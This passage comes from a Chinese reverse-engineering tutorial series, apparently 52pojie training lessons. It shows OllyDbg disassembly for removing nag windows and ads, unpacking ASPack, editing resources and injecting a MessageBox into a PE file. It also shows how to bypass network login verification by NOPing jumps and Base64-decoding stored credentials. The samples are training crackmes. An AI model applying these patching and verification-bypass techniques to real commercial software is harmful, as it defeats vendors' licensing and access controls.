call dword ptr ds:[<&user32.#597>]            ; user32.SetDlgItemTextW\n0040152C    5F              pop edi                                       ; kernel32.7C817077\n0040152D    5E              pop esi                                       ; kernel32.7C817077\n0040152E    33C0            xor eax,eax\n00401530    5D              pop ebp                                       ; kernel32.7C817077\n00401531    C3              retn;关键字符串函数结束\n```\n\n从上面的代码可知，NAG窗口函数与主程序函数在一个父函数中，父函数中没有跳转语句，所以不能靠跳转绕过NAG，试一下nop掉NAG相关代码。\n\n程序运行到NAG的call指令，堆栈窗口显示\n\n```asm\n0012FCB8   002A074C  |hOwner = 002A074C ('吾爱破解培训第二课实例一',class='#32770')\n0012FCBC   00402180  |Text = \"来试试我的程序啊\"\n0012FCC0   00402170  |Title = \"52PoJie\"\n0012FCC4   00000000  \\Style = MB_OK|MB_APPLMODAL\n```\n\n即运行这个函数前有4个参数压栈，也就是call前面的4个`push`指令。\n\n```asm\n004014E0    6A 00           push 0x0\n004014E2    68 70214000     push dumped_.00402170                         ; 52PoJie\n004014E7    68 80214000     push dumped_.00402180                         ; 来试试我的程序啊\n004014EC    56              push esi\n004014ED    FF15 EC204000   call dword ptr ds:[<&user32.#484>]            ; user32.MessageBoxW\n```\n\n重载，将这5条指令用nop填充，运行，发现NAG窗口消失了。复制到可执行文件，保存。在此程序的基础上去除页面。\n\n3个NAG页面分别为：https://www.52pojie.cn/ 、https://www.52pojie.cn/forum-5-1.html 、http://www.52pojie.cn/forum-68-1.html 。\n\n查找关键字符串，可看到其中一个NAG页面 https://www.52pojie.cn/ 。同样，没有跳转指令，用nop填充，操作与NAG弹窗一样。保存，载入新程序。\n\n我们知道，弹页面用的是ShellExecuteA/W、WinExec、CreateProcessA/W几个函数。Ctrl+G搜索这些函数下断。F9运行，等待一会儿，程序断在某个函数处。Alt+F9返回，程序运行到用户领空的下一指令，看到弹出页面 https://www.52pojie.cn/forum-5-1.html ，也看到了函数调用。由于又没有跳转指令，依旧用nop。\n\n```asm\n0040125C    6A 05           push 0x5\n0040125E    53              push ebx\n0040125F    FF15 10204000   call dword ptr ds:[<&kernel32.#WriteCons>; kernel32.WinExec\n```\n\n保存，载入新程序。\n\n依旧那几个函数，Alt+F9返回后弹出页面 http://www.52pojie.cn/forum-68-1.html 。将刚才几个函数的断点去掉，在call指令处下断。\n\n```asm\n0040143B    FF15 20204000   call dword ptr ds:[<&kernel32.#CreatePro>; kernel32.CreateProcessA\n```\n\nF9运行，查看堆栈窗口\n\n```asm\n00C3FEC4   00000000  |ModuleFileName = NULL\n00C3FEC8   003A4210  |CommandLine = \"C:\\Program Files\\Internet Explorer\\iexplore.exe http://www.52pojie.cn/forum-68-1.html\"\n00C3FECC   00000000  |pProcessSecurity = NULL\n00C3FED0   00000000  |pThreadSecurity = NULL\n00C3FED4   00000000  |InheritHandles = FALSE\n00C3FED8   00000000  |CreationFlags = 0\n00C3FEDC   00000000  |pEnvironment = NULL\n00C3FEE0   00000000  |CurrentDir = NULL\n00C3FEE4   00C3FEF8  |pStartupInfo = 00C3FEF8\n00C3FEE8   00C3FF3C  \\pProcessInfo = 00C3FF3C\n```\n\n```asm\n00401403    E8 C2090000     call <jmp.&msvcr100.#1492>\n00401408    83C4 0C         add esp,0xC\n0040140B    8D55 88         lea edx,dword ptr ss:[ebp-0x78]\n0040140E    52              push edx\n0040140F    8D85 44FFFFFF   lea eax,dword ptr ss:[ebp-0xBC]\n00401415    50              push eax\n00401416    6A 00           push 0x0\n00401418    6A 00           push 0x0\n0040141A    6A 00           push 0x0\n0040141C    6A 00           push 0x0\n0040141E    6A 00           push 0x0\n00401420    6A 00           push 0x0\n00401422    53              push ebx\n00401423    B9 01000000     mov ecx,0x1\n00401428    6A 00           push 0x0\n0040142A    C785 70FFFFFF 0>mov dword ptr ss:[ebp-0x90],0x1\n00401434    66:898D 74FFFFF>mov word ptr ss:[ebp-0x8C],cx\n0040143B    FF15 20204000   call dword ptr ds:[<&kernel32.#CreatePro>; kernel32.CreateProcessA\n```\n\n将`push edx`及下面的指令全都nop掉，保存。至此，所有NAG都被清除。\n\n# 3. 实例二\n\nASPack壳，用ESP定律很快到达OEP，脱壳，用FixRes重构一下资源。\n\n运行程序，程序会将IE主页修改为 http://www.52pojie.cn/ ，主程序中央内置了广告，过了一会儿桌面右下角会闪出广告。\n\n目标：取消主页修改，去除广告。\n\n载入OD，查找字符串看看。\n\n```asm\n地址       反汇编                                    文本字符串\n0040193D   push dumped_.004034D0                     SeDebugPrivilege\n004019E2   mov [local.14],dumped_.004034F8           SOFTWARE\\microsoft\\Internet Explorer\\Main;微软浏览器、IE浏览器\n004019EE   mov esi,dumped_.0040354C                  http://www.52pojie.cn;广告地址\n00401A15   push dumped_.00403578                     Start Page;开始页\n00401A4B   push dumped_.00403590                     Start Page\n00401A81   push dumped_.004035A8                     Default_Page_URL;默认页\n00401B4F   push dumped_.004035CC                     我就是广告\\r\\n来把我干掉啊\\r\\n加油！;右下角的广告\n00401BA9   push dumped_.004035F4                     explorer.exe http://www.52pojie.cn/thread-384195-1-1.html\n00401C4A   push dumped_.00403630                     http://www.52pojie.cn/portal.php;主程序中间的广告\n00401DA9   push dumped_.00403674                     explorer.exe http://www.52pojie.cn/thread-384195-1-1.html\n```\n\n先去掉IE、微软的默认广告主页。双击进去，发现整个函数都是修改浏览器的主页面。\n\n```asm\n004019D0  /$  55            push ebp\n004019D1  |.  8BEC          mov ebp,esp\n004019D3  |.  83EC 38       sub esp,0x38\n004019D6  |.  A1 28504000   mov eax,dword ptr ds:[0x405028]\n004019DB  |.  33C5          xor eax,ebp\n004019DD  |.  8945 F8       mov [local.2],eax\n004019E0  |.  56            push esi\n004019E1  |.  57            push edi\n004019E2  |.  C745 C8 F8344>mov [local.14],dumped_.004034F8          ;  SOFTWARE\\microsoft\\Internet Explorer\\Main\n004019E9  |.  B9 0B000000   mov ecx,0xB\n004019EE  |.  BE 4C354000   mov esi,dumped_.0040354C                 ;  http://www.52pojie.cn\n004019F3  |.  8D7D CC       lea edi,[local.13]\n004019F6  |.  F3:A5         rep movs dword ptr es:[edi],dword ptr ds>\n004019F8  |.  8D45 FC       lea eax,[local.1]\n004019FB  |.  50            push eax                                 ; /pHandle = NULL\n004019FC  |.  8B4D C8       mov ecx,[local.14]                       ; |\n004019FF  |.  51            push ecx                                 ; |Subkey = \"?粒灴粁...\"\n00401A00  |.  68 02000080   push 0x80000002                          ; |hKey = HKEY_LOCAL_MACHINE\n00401A05  |.  FF15 10304000 call dword ptr ds:[<&advapi32.#465>]     ; \\RegCreateKeyW\n00401A0B  |.  6A 2C         push 0x2C                                ; /BufSize = 2C (44.)\n00401A0D  |.  8D55 CC       lea edx,[local.13]                       ; |\n00401A10  |.  52            push edx                                 ; |Buffer = ntdll.KiFastSystemCallRet\n00401A11  |.  6A 01         push 0x1                                 ; |ValueType = REG_SZ\n00401A13  |.  6A 00         push 0x0                                 ; |Reserved = 0x0\n00401A15  |.  68 78354000   push dumped_.00403578                    ; |Start Page\n00401A1A  |.  8B45 FC       mov eax,[local.1]                        ; |\n00401A1D  |.  50            push eax                                 ; |hKey = 0x0\n00401A1E  |.  FF15 00304000 call dword ptr ds:[<&advapi32.#509>]     ; \\RegSetValueExW\n00401A24  |.  8B4D FC       mov ecx,[local.1]\n00401A27  |.  51            push ecx                                 ; /hKey = 0012FFB0\n00401A28  |.  FF15 08304000 call dword ptr ds:[<&advapi32.#459>]     ; \\RegCloseKey\n00401A2E  |.  8D55 FC       lea edx,[local.1]\n00401A31  |.  52            push edx                                 ; /pHandle = ntdll.KiFastSystemCallRet\n00401A32  |.  8B45 C8       mov eax,[local.14]                       ; |\n00401A35  |.  50            push eax                                 ; |Subkey = NULL\n00401A36  |.  68 01000080   push 0x80000001                          ; |hKey = HKEY_CURRENT_USER\n00401A3B  |.  FF15 10304000 call dword ptr ds:[<&advapi32.#465>]     ; \\RegCreateKeyW\n00401A41  |.  6A 2C         push 0x2C                                ; /BufSize = 2C (44.)\n00401A43  |.  8D4D CC       lea ecx,[local.13]                       ; |\n00401A46  |.  51            push ecx                                 ; |Buffer = 0012FFB0\n00401A47  |.  6A 01         push 0x1                                 ; |ValueType = REG_SZ\n00401A49  |.  6A 00         push 0x0                                 ; |Reserved = 0x0\n00401A4B  |.  68 90354000   push dumped_.00403590                    ; |Start Page\n00401A50  |.  8B55 FC       mov edx,[local.1]                        ; |\n00401A53  |.  52            push edx                                 ; |hKey = 0x7C92E4F4\n00401A54  |.  FF15 00304000 call dword ptr ds:[<&advapi32.#509>]     ; \\RegSetValueExW\n00401A5A  |.  8B45 FC       mov eax,[local.1]\n00401A5D  |.  50            push eax                                 ; /hKey = NULL\n00401A5E  |.  FF15 08304000 call dword ptr ds:[<&advapi32.#459>]     ; \\RegCloseKey\n00401A64  |.  8D4D FC       lea ecx,[local.1]\n00401A67  |.  51            push ecx                                 ; /pHandle = 0012FFB0\n00401A68  |.  8B55 C8       mov edx,[local.14]                       ; |\n00401A6B  |.  52            push edx                                 ; |Subkey = \"跃?\"\n00401A6C  |.  68 01000080   push 0x80000001                          ; |hKey = HKEY_CURRENT_USER\n00401A71  |.  FF15 10304000 call dword ptr ds:[<&advapi32.#465>]     ; \\RegCreateKeyW\n00401A77  |.  6A 2C         push 0x2C                                ; /BufSize = 2C (44.)\n00401A79  |.  8D45 CC       lea eax,[local.13]                       ; |\n00401A7C  |.  50            push eax                                 ; |Buffer = NULL\n00401A7D  |.  6A 01         push 0x1                                 ; |ValueType = REG_SZ\n00401A7F  |.  6A 00         push 0x0                                 ; |Reserved = 0x0\n00401A81  |.  68 A8354000   push dumped_.004035A8                    ; |Default_Page_URL\n00401A86  |.  8B4D FC       mov ecx,[local.1]                        ; |\n00401A89  |.  51            push ecx                                 ; |hKey = 0x12FFB0\n00401A8A  |.  FF15 00304000 call dword ptr ds:[<&advapi32.#509>]     ; \\RegSetValueExW\n00401A90  |.  8B55 FC       mov edx,[local.1]\n00401A93  |.  52            push edx                                 ; /hKey = 7C92E4F4\n00401A94  |.  FF15 08304000 call dword ptr ds:[<&advapi32.#459>]     ; \\RegCloseKey\n00401A9A  |.  5F            pop edi                                  ;  kernel32.7C817077\n00401A9B  |.  5E            pop esi                                  ;  kernel32.7C817077\n00401A9C  |.  8B4D F8       mov ecx,[local.2]                        ;  kernel32.7C817080\n00401A9F  |.  33CD          xor ecx,ebp\n00401AA1  |.  E8 380B0000   call dumped_.004025DE\n00401AA6  |.  8BE5          mov esp,ebp\n00401AA8  |.  5D            pop ebp                                  ;  kernel32.7C817077\n00401AA9  \\.  C3            retn\n```\n\n这时可以直接将第1行代码修改为`retn`，但必须保证这个`retn`与段尾的`retn`状态一致，否则会导致堆栈不平衡。或者运行到段尾，执行返回，将父函数nop掉。保存，载入新程序。\n\n去除桌面右下角的广告。在CreateWindowExA/W、DialogBoxParamA/W下断运行。会自动停很多次，因为有很多窗口，但有些很明显不是，比如主程序还没出来就断下的肯定不是。主程序出来后要等一会儿才会出现右下角广告，所以需要等待一点时间才会断下。\n\n最后找到堆栈窗口为这个时，是右下角广告。\n\n```asm\n015FFF9C   00401BFB  /CALL 到 DialogBoxParamW 来自 dumped_1.00401BF5\n015FFFA0   00400000  |hInst = 00400000\n015FFFA4   00000084  |pTemplate = 0x84\n015FFFA8   00000000  |hOwner = NULL\n015FFFAC   00401B00  |DlgProc = dumped_1.00401B00\n015FFFB0   00000000  \\lParam = NULL\n```\n\n选中堆栈窗口的第1行，回车返回调用函数：\n\n```asm\n00401BD0  /.  55            push ebp\n00401BD1  |.  8BEC          mov ebp,esp\n00401BD3  |.  68 204E0000   push 0x4E20                                            ; /Timeout = 20000. ms\n00401BD8  |.  FF15 60304000 call dword ptr ds:[<&kernel32.#SystemTimeToFileTime_83>; \\Sleep\n00401BDE  |.  6A 00         push 0x0                                               ; /lParam = NULL\n00401BE0  |.  68 001B4000   push dumped_1.00401B00                                 ; |DlgProc = dumped_1.00401B00\n00401BE5  |.  6A 00         push 0x0                                               ; |hOwner = NULL\n00401BE7  |.  68 84000000   push 0x84                                              ; |pTemplate = 0x84\n00401BEC  |.  6A 00         push 0x0                                               ; |/pModule = NULL\n00401BEE  |.  FF15 1C304000 call dword ptr ds:[<&kernel32.#GetNamedPipeHandleState>; |\\GetModuleHandleW\n00401BF4  |.  50            push eax                                               ; |hInst = 00400000\n00401BF5  |.  FF15 E4304000 call dword ptr ds:[<&user32.#160>]                     ; \\DialogBoxParamW\n00401BFB  |.  5D            pop ebp                                                ;  dumped_1.00401BFB\n00401BFC  \\.  C3            retn\n```\n\n整个函数的意思是sleep20s弹出广告，那就直接在开头`retn`。保存，载入新程序。\n\n去掉中央内置广告。查找字符串跟进\n\n```asm\n00401C4A  |.  68 30364000   push dumped_1.00403630                   ;  http://www.52pojie.cn/portal.php\n```\n\n在数据窗口跟随`403630`，用00填充 http://www.52pojie.cn/portal.php ，保存。但是主程序还是有这个框框，只是不显示页面而已。如果想要美观一点。可以用Restorator软件，将中间的框框的“可视”取消，F8提交更改，保存。\n\n{% asset_img 可视.png 将可视取消 %}\n\n# 4. 修改版权和资源\n\n用实例二DIY。\n\n## 4.1 利用资源编辑器修改版权\n\n同样用Restorator/ResEdit/ResHacker，修改主程序的文字信息。(因为在OD看不到主程序的文字信息)\n\n{% asset_img Restorator修改版权.png Restorator修改版权 %}\n\n## 4.2 利用API修改版权\n\n修改右下角广告的文字信息。\n\nSetDlgItemTextA/W：DialogBox控件设置文本\n\n在中文搜索引擎找到关键句去到反汇编窗口\n\n```asm\n0040282F    68 181A5500     push 1_备份.00551A18                       ; 我就是广告\\r\\n来把我干掉啊\\r\\n加油！\n```\n\n在命令窗口输入`d 551A18`定位字符串，将想要写入的文字找个网页转换成十六进制。\n\n```\n62 11 4e 0d 66 2f 5e 7f 54 4a ff 0c 62 11 53 ea 66 2f 5c 0f 53 ef 72 31\n```\n\n由于PE文件是小端序的，所以将“6211”在OD里必须“1162”存放，以此类推。\n\n```\n11 62 0d 4e 2f 66 7f 5e 4a 54 0c ff 11 62 ea 53 2f 66 0f 5c ef 53 31 72\n```\n\n将多余的文字用00填充，写入的最好不要超过原本文字大小，以防产生各种问题。\n\n{% asset_img 修改文本.jpg 修改文本 %}\n\n## 4.3 利用十六进制编辑器修改\n\n用C32asm/WinHEX修改。找到位置直接打16进制进去，目前我还没找到粘贴二进制数据的地方，所以只能手打。修改完后保存即可。\n\n# 5. 汉化\n\n在汉化时，要注意保留快捷键，比如&D、&F。\n\n{% asset_img 汉化.png 汉化 %}\n\n{% asset_img 汉化前.png 汉化前 %}\n\n{% asset_img 汉化后.png 汉化后 %}\n\n# 6. 增加弹窗\n\n用Stud_PE载入程序，在函数那里找user32模块的`MessageBoxA`函数，如果没有则右键->add new import，dll选择user32.dll的路径(在吾爱虚拟机中路径为C:\\WINDOWS\\system32\\user32.dll)，选择`MessageBoxA`函数，添加到列表。RVA为`1C3173`。\n\n{% asset_img 添加函数.png 添加MessageBoxA %}\n\n在区段那里新增一个区段。原始大小、虚拟大小为1000，区段数据选择“用空字节填充区段”。区段的RVA为`1C4000`。再用OD载入去到`5C4000`处编写代码。\n\nMeaagexBoxA有4个参数：\n\n```c\nWINUSERAPI int WINAPI MessageBoxA(\nHWND hWnd,\t\t\t//获取父句柄\nLPCWSTR lpText,\t\t//文本信息\nLPCWSTR lpCaption,\t//标题\nUINT uType);\t\t//风格\n```\n\n在OD中，是从下往上push参数的。\n\n```asm\npush 0\t\t\t\t\t\t;0表示只有一个确认键\npush 地址\t\t\t\t\t\t;标题\npush 地址\t\t\t\t  \t\t;文本\npush 0\t\t\t\t\t\t;0表示没有父句柄\ncall dword ptr ds:[5C3173]\t;MessageBoxA的VA地址\n```\n\n地址可以是这个区段任意某个位置。标题和文本在数据窗口修改。修改完后会自动在反汇编窗口补上代码。别忘了执行完`MessageBoxA`后跳回OEP执行主程序。\n\n```asm\njmp 5025A6\n```\n\n复制到可执行文件，保存，用LoadPE或Stud_PE修改入口点为`1C4000`。\n\nMessageBoxW一样操作。\n\n{% asset_img 增加弹窗.png 增加弹窗 %}\n\n","categories":["Windows逆向"],"tags":["OllyDbg","吾爱破解培训"]},{"title":"第七课——常见的网络验证","url":"/posts/a4cc5112.html","content":"\n# 1. 基础知识\n\n## 1.1 协议\n\n网络验证协议分为UDP和TCP协议。\n\n目前市面上流行的网络验证一半都是TCP协议的。\n\n采用TCP协议程序发送数据所用API为：send，接收数据所用API为：recv\n\n采用UDP协议程序发送数据所用API为：WSASend，接收数据所用API为：WSARecv\n\n<!--more-->\n\n在分析封包时，了解程序使用的协议类型，采用相对应抓包工具。有的抓包工具只能抓到TCP协议发送的封包数据，比如用易语言网截所写的抓包工具，那种工具只能抓到TCP协议的封包。\n\n## 1.2 网络验证类型\n\n网络验证类型常见的为：Asp验证，PHP验证，云验证，exe程序互相通信验证。\n\n判断验证类型的例子：\n\nAsp验证 飘零网络验证\n\nPHP验证 可可网络验证\n\n云验证  注册宝网络验证\n\n## 1.3 课程流程\n\n利用新浪微博建立一个简单的未加密用户名密码验证，讲解起验证形成过程，讲解后破解(课件1)\n\n利用新浪微博建立一个简单的加密用户名密码验证，讲解起验证形成过程，讲解后破解(课件2)\n\n讲解易语言编译出客户端，服务端验证形成过程\n\n未加密验证用户密码\n\nBASE64加密验证用户密码到期时间\n\n当程序无壳时，可以用查找字符串方法寻找敏感字符串；加壳时，可以用易语言的按钮事件：FF55FC5F5E(死码)，前提是这个程序是用易语言编写的。下断运行，F7步入就是主程序代码。\n\n# 2. 实例\n\n这些程序都是用易语言编写的，所以也可以当作是易语言专栏吧。\n\n## 2.1 网页未加密\n\n破解简单说下：\n\n程序运行一下知道大概流程，载入OD寻找敏感字符串。发现登录成功在很大的一个循环里，登录失败在循环外。\n\n```asm\n004025D7  |.  895D C0       |mov [local.16],ebx\n004025DA  |.  8B5D C0       |mov ebx,[local.16]\n004025DD  |.  FF33          |push dword ptr ds:[ebx]\n004025DF  |.  68 766C4800   |push 课件1_网.00486C76                     ;  到期时间：\n004025E4  |.  B9 02000000   |mov ecx,0x2\n004025E9  |.  E8 BEF4FFFF   |call 课件1_网.00401AAC\n004025EE  |.  83C4 08       |add esp,0x8\n004025F1  |.  8945 BC       |mov [local.17],eax\n004025F4  |.  6A 00         |push 0x0\n004025F6  |.  6A 00         |push 0x0\n004025F8  |.  6A 00         |push 0x0\n004025FA  |.  68 04000080   |push 0x80000004\n004025FF  |.  6A 00         |push 0x0\n00402601  |.  68 816C4800   |push 课件1_网.00486C81                     ;  登录成功\n00402606  |.  68 01030080   |push 0x80000301\n0040260B  |.  6A 00         |push 0x0\n0040260D  |.  68 00000000   |push 0x0\n00402612  |.  68 04000080   |push 0x80000004\n00402617  |.  6A 00         |push 0x0\n00402619  |.  8B45 BC       |mov eax,[local.17]\n```\n\n```asm\n00402655  |> \\83C4 0C       add esp,0xC\n00402658  |.  6A 00         push 0x0\n0040265A  |.  6A 00         push 0x0\n0040265C  |.  6A 00         push 0x0\n0040265E  |.  68 04000080   push 0x80000004\n00402663  |.  6A 00         push 0x0\n00402665  |.  68 8A6C4800   push 课件1_网.00486C8A                      ;  登录失败\n0040266A  |.  68 01030080   push 0x80000301\n0040266F  |.  6A 00         push 0x0\n00402671  |.  68 00000000   push 0x0\n00402676  |.  68 04000080   push 0x80000004\n0040267B  |.  6A 00         push 0x0\n0040267D  |.  68 936C4800   push 课件1_网.00486C93                      ;  账号密码不正确\n00402682  |.  68 04000000   push 0x4\n```\n\n猜测登录时，程序先比对输入的用户名和某网页的所有用户名，如果存在再比对这个用户名的密码。两个都比对成功则执行登录成功的代码。\n\n输入假用户名和假密码进入循环。\n\n```asm\n00402485  |.  50            |push eax\n00402486  |.  3BC8          |cmp ecx,eax\n00402488  |.  0F8F C7010000 |jg 课件1_网.00402655                       ;  判断输入是否为空\n0040248E  |.  8B5D D0       |mov ebx,[local.12]\n00402491  |.  E8 ADEBFFFF   |call 课件1_网.00401043\n```\n\n```asm\n0040250B  |.  83C4 04       |add esp,0x4\n0040250E  |>  837D B8 00    |cmp [local.18],0x0\n00402512  |.  0F84 35010000 |je 课件1_网.0040264D                       ;  这个跳转跳出循环外，不能跳转\n00402518  |.  8B5D CC       |mov ebx,[local.13]\n0040251B  |.  E8 23EBFFFF   |call 课件1_网.00401043\n```\n\n```asm\n00402595  |.  83C4 04       |add esp,0x4\n00402598  |>  837D B8 00    |cmp [local.18],0x0\n0040259C  |.  0F84 AB000000 |je 课件1_网.0040264D                       ;  这个跳转跳出循环外，不能跳转\n004025A2  |.  8B5D C8       |mov ebx,[local.14]\n004025A5  |.  E8 99EAFFFF   |call 课件1_网.00401043\n```\n\n将这两个`je`指令都nop掉，实现破解。\n\n但这节课的重点不是破解，而是算法流程。\n\n载入OD，Ctrl+B输入二进制字串`FF 55 FC 5F 5E`，这是易语言的按钮事件死码。\n\n```asm\n0041E18D  |> \\FF55 FC       call [local.1]\n0041E190  |.  5F            pop edi                                  ;  kernel32.7C817077\n0041E191  |.  5E            pop esi                                  ;  kernel32.7C817077\n```\n\nF9运行至此处，再F9出现主程序，输入用户名和密码后点击注册，程序再次停在此处，现在F7进入call指令，就是作者编写的易语言代码处了。F8步过跟踪，到这里就是将要访问的网页压栈。\n\n```asm\n00401BD1  |.  68 FA6B4800   push 课件1_网.00486BFA                      ;  http://blog.sina.com.cn/s/blog_151e522e60102vy1h.html\n```\n\n{% asset_img 访问网页.png 访问网页 %}\n\n看着貌似写了一堆奇奇怪怪的东西，先不管它。回到OD继续往下，会发现信息窗口有类似于html的字符串，在信息窗口选中右键->数据窗口中跟随数值，发现这个程序的操作是把读取网页源码。\n\n```asm\n00177CF0  00 00 00 00 DF 00 00 00 3C 68 74 6D 6C 3E 0D 0A  ....?..<html>..\n00177D00  3C 68 65 61 64 3E 0D 0A 3C 73 63 72 69 70 74 20  <head>..<script\n00177D10  6C 61 6E 67 75 61 67 65 3D 22 6A 61 76 61 73 63  language=\"javasc\n00177D20  72 69 70 74 22 3E 73 65 74 54 69 6D 65 6F 75 74  ript\">setTimeout\n00177D30  28 22 6C 6F 63 61 74 69 6F 6E 2E 72 65 70 6C 61  (\"location.repla\n00177D40  63 65 28 6C 6F 63 61 74 69 6F 6E 2E 68 72 65 66  ce(location.href\n00177D50  2E 73 70 6C 69 74 28 5C 22 23 5C 22 29 5B 30 5D  .split(\\\"#\\\")[0]\n00177D60  29 22 2C 31 30 30 30 29 3B 3C 2F 73 63 72 69 70  )\",1000);</scrip\n00177D70  74 3E 0D 0A 3C 2F 68 65 61 64 3E 0D 0A 3C 69 66  t>..</head>..<if\n00177D80  72 61 6D 65 20 73 72 63 3D 22 68 74 74 70 3A 2F  rame src=\"http:/\n00177D90  2F 32 32 32 2E 32 30 31 2E 35 34 2E 36 34 3A 38  /222.201.54.64:8\n00177DA0  39 2F 66 6C 61 73 68 72 65 64 69 72 2E 68 74 6D  9/flashredir.htm\n00177DB0  6C 22 20 66 72 61 6D 65 62 6F 72 64 65 72 3D 30  l\" frameborder=0\n00177DC0  3E 3C 2F 69 66 72 61 6D 65 3E 0D 0A 3C 2F 68 74  ></iframe>..</ht\n00177DD0  6D 6C 3E 0D 0A 0D 0A 68 1D 00 1E 00 31 01 08 00  ml>....h\u001d.\u001e.1\u0001\b.\n00177DE0  3C 68 74 6D 6C 3E 0D 0A 3C 68 65 61 64 3E 0D 0A  <html>..<head>..\n00177DF0  3C 73 63 72 69 70 74 20 6C 61 6E 67 75 61 67 65  <script language\n00177E00  3D 22 6A 61 76 61 73 63 72 69 70 74 22 3E 73 65  =\"javascript\">se\n00177E10  74 54 69 6D 65 6F 75 74 28 22 6C 6F 63 61 74 69  tTimeout(\"locati\n00177E20  6F 6E 2E 72 65 70 6C 61 63 65 28 6C 6F 63 61 74  on.replace(locat\n00177E30  69 6F 6E 2E 68 72 65 66 2E 73 70 6C 69 74 28 5C  ion.href.split(\\\n00177E40  22 23 5C 22 29 5B 30 5D 29 22 2C 31 30 30 30 29  \"#\\\")[0])\",1000)\n00177E50  3B 3C 2F 73 63 72 69 70 74 3E 0D 0A 3C 2F 68 65  ;</script>..</he\n00177E60  61 64 3E 0D 0A 3C 69 66 72 61 6D 65 20 73 72 63  ad>..<iframe src\n00177E70  3D 22 68 74 74 70 3A 2F 2F 32 32 32 2E 32 30 31  =\"http://222.201\n00177E80  2E 35 34 2E 36 34 3A 38 39 2F 66 6C 61 73 68 72  .54.64:89/flashr\n00177E90  65 64 69 72 2E 68 74 6D 6C 22 20 66 72 61 6D 65  edir.html\" frame\n00177EA0  62 6F 72 64 65 72 3D 30 3E 3C 2F 69 66 72 61 6D  border=0></ifram\n00177EB0  65 3E 0D 0A 3C 2F 68 74 6D 6C 3E 0D 0A 0D 0A 00  e>..</html>.....\n```\n\n再往下滑看到正文的一些字符串，应该是提取这些字符串之间的字符串，存进内存里。\n\n```asm\n00401E97  |.  68 536C4800   push 课件1_网.00486C53                      ;  <p>^^^\n...\n(进入第一个大循环)\n00401F82  |.  68 5A6C4800   |push 课件1_网.00486C5A                     ;  $$$\n...\n00402003  |.  68 5E6C4800   |push 课件1_网.00486C5E                     ;  ###\n...\n00402084  |.  68 626C4800   |push 课件1_网.00486C62                     ;  ***\n```\n\n```asm\n(进入第二个大循环)\n00402485  |.  50            |push eax\n00402486  |.  3BC8          |cmp ecx,eax\n00402488  |.  0F8F C7010000 |jg 课件1_网.00402655                       ;  判断输入是否为空\n...\n004024D9  |.  83C4 10       |add esp,0x10                            ;  输入的用户名\n004024DC  |.  8945 BC       |mov [local.17],eax                      ;  存进local.17\n```\n\n此时发现寄存器窗口的eax也是我们输入的用户名，右键->数据窗口中跟随。\n\n```asm\n00169970  61 62 63 00 01 00 00 00 02 00 02 00 3C 01 0A 00  abc.\u0001...\u0002.\u0002.<\u0001..\n00169980  61 62 63 39 39 00 37 00 02 00 02 00 22 01 0B 00  abc99.7.\u0002.\u0002.\"\u0001\u000b.\n00169990  61 62 63 31 00 01 15 00 24 00 02 00 20 01 0C 00  abc1.\u0001\u0015.$.\u0002. \u0001..\n```\n\n发现上面是\\^\\^\\^和\\$\\$\\$之间的内容“abc”，下面也是\\^\\^\\^和$$$之间的内容“abc1”。\n\n```asm\n00402512     /0F84 35010000 je 课件1_网.0040264D                        ;  不能跳转\n```\n\n绕过这个跳转继续往下，到达这里后eax的值为111，是$$$和###之间的内容“111”，并且对应网页，前面的字符串是“abc”。数据窗口这一行的上面也是“abc”。\n\n```asm\n0040255E  |.  E8 5F100000   |call 课件1_网.004035C2\n00402563  |.  83C4 10       |add esp,0x10\n```\n\n```asm\n00169970  61 62 63 00 01 00 00 00 02 00 02 00 3C 01 0C 00  abc.\u0001...\u0002.\u0002.<\u0001..\n00169980  31 31 31 00 39 00 37 00 02 00 02 00 22 01 0B 00  111.9.7.\u0002.\u0002.\"\u0001\u000b.\n00169990  61 62 63 31 00 01 15 00 24 00 02 00 20 01 0C 00  abc1.\u0001\u0015.$.\u0002. \u0001..\n```\n\n继续往下\n\n```asm\n0040259C     /0F84 AB000000 je 课件1_网.0040264D                        ;  不能跳转\n```\n\n绕过跳转\n\n```asm\n00402630  |.  E8 870F0000   |call 课件1_网.004035BC\n```\n\n运行到这里时弹窗说登录成功，到期时间无法显示。但可以猜测` ^^^abc$$$111###30*** `这一串中的“30”应该是到期时间。所以这一串奇怪的字符其实包含了用户名、密码和到期时间。\n\n{% asset_img 登录成功.png 登录成功 %}\n\n## 2.2 网页加密\n\n破解同样是修改两个跳转指令。\n\n算法分析：与2.1同样操作来到\n\n```asm\n004019C0  |.  68 CD9D4800   push 课件2_网.00489DCD                      ;  http://blog.sina.com.cn/s/blog_151e522e60102vzdy.html\n```\n\n{% asset_img 网页加密.png 网页加密 %}\n\n这时直接在程序按照分隔符输入字符串是不对的。看到字符串有等号很明显是Base64加密。拿去解码即可得真正的用户名、密码和到期时间。\n\n{% asset_img base64解码.png base64解码 %}\n\n但我们这个是分析流程，所以还是继续往下看看吧\n\n```asm\n00401F22  |.  83C4 1C       |add esp,0x1C                            ;  加密后的用户名(第一次循环用户名为空，第二次才显示第一行的用户名)\n00401F25  |.  8945 AC       |mov [local.21],eax\n00401F28  |.  8D45 AC       |lea eax,[local.21]\n00401F2B  |.  50            |push eax\n00401F2C  |.  68 08FA4A00   |push 课件2_网.004AFA08\n00401F31  |.  8B0424        |mov eax,dword ptr ss:[esp]\n00401F34  |.  8B00          |mov eax,dword ptr ds:[eax]\n00401F36  |.  8B00          |mov eax,dword ptr ds:[eax]\n00401F38  |.  FF50 0C       |call dword ptr ds:[eax+0xC]             ;  base64解密出来的用户名\n00401F3B  |.  8945 A8       |mov [local.22],eax\n```\n\n执行完base64解密的函数后，eax右键->数据窗口中跟随，就可看到解密出来的“abc”。\n\n```asm\n001702A8  01 00 00 00 03 00 00 00 61 62 63 00 75 01 08 00  \u0001...\u0003...abc.u\u0001\b.\n```\n\n密码和到期时间一样的操作。\n\n## 2.3 EXE验证\n\n爆破：\n\n开启服务端，再将客户端载入OD，查找敏感字符串或设置按钮事件，找到函数段首下断运行，点击“验证”，程序停在断点处。\n\n```asm\n004012EB  |. /0F85 99000000 jnz 课件3_易.0040138A                       ;  不能跳\n004012F1  |. |8B5D F8       mov ebx,[local.2]\n004012F4  |. |E8 0BFDFFFF   call 课件3_易.00401004\n004012F9  |. |B8 01000000   mov eax,0x1\n004012FE  |. |3BC1          cmp eax,ecx                              ;  课件3_易.00482C3B\n00401300  |. |7C 0D         jl short 课件3_易.0040130F\n00401302  |. |68 01000000   push 0x1\n00401307  |. |E8 4E030000   call 课件3_易.0040165A\n0040130C  |. |83C4 04       add esp,0x4\n0040130F  |> |C1E0 02       shl eax,0x2\n00401312  |. |03D8 